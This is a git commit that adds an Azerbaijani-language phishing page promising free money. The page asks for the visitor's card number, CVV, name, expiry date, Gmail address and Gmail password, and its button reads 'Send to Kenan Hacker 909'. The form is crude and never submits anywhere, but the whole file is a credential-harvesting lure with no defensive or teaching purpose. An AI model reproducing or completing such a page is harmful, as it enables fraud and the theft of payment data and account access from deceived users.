d7b620296cb98710492073c68f2a5186e884320a
KH9-hack-PC <909Passhack@gmail.com>
2021-12-25 20:31:44 +0400

    second commit

---
+++ index.php
@@ -0,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='UTF-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Pulsuz Pul Qazan</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <style>
+        *{
+           margin: 0;
+           padding: 0;
+           color: orange;
+        }
+        body{
+            background-color: blueviolet;
+        }
+    </style>
+</head>
+<body>
+    <fieldset>
+        <legend>Kartınız Haqqında</legend>
+    <table>
+    <tr>
+    <form>
+            <td>
+                <label id="BASLİQ">Kartınızın Növü</label>
+                <select>
+                    <option>
+                        Visa
+                    </option>
+                    <option>
+                        MasterCard
+                    </option>
+                    <option>
+                        American Express
+                    </option>
+                </select>
+            </td>
+            <tr>
+            <td>
+            <label>Kartınızın Nömrəsi</label>
+            <input type="number" placeholder="Kartınızın Nömrəsi">
+            </td>
+            </tr>
+            <tr>
+            <td>
+            <label>Kartınızın CVV</label>
+            <input type="number" placeholder="Kartınızın CVV">
+            </td>
+            </tr>
+            <tr>
+            <td>
+            <label>Kartınızın Adı</label>
+            <input type="text" placeholder="Kartınızın Adı">
+            </td>
+            </tr>
+            <tr>
+            <td>
+            <label>Kartınızın Soyadı</label>
+            <input type="text" placeholder="Kartınızın Soyadı">
+            </td>
+            </tr>
+            <tr>
+            <td>
+            <label>Kartınızın Vaxtı</label>
+            <input type="number" placeholder="Ay">
+            <input type="number" placeholder="Il">
+            </td>
+            </tr>
+            <tr>
+            <td>
+            <label>Gmailiniz</label>
+            <input type="email" placeholder="Gmailiniz">
+            </td>
+            </tr>
+            <tr>
+            <td>
+            <label>Gmailinizin Parolu</label>
+            <input type="password" placeholder="Gmailinizin Parolu">
+            </td>
+            </tr>
+        <tr>
+            <td>
+                <label>Pul</label>
+                <input type="number" placeholder="Neçə manat pul istərdiz ?">
+            </td>
+        </tr>
+    </form>
+    </tr>
+    </table>
+   </fieldset>
+<input type="submit" value="Send to Kenan Hacker 909">
+</body>
+</html>
